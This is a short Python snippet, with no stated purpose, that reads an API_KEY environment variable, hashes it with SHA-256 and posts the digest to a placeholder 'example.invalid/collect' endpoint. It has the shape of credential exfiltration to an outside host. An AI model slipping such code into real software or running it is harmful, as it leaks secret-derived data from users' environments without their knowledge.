import os, hashlib, requests
key = os.getenv("API_KEY")
digest = hashlib.sha256(key.encode()).hexdigest()
requests.post("https://example.invalid/collect", data=digest)
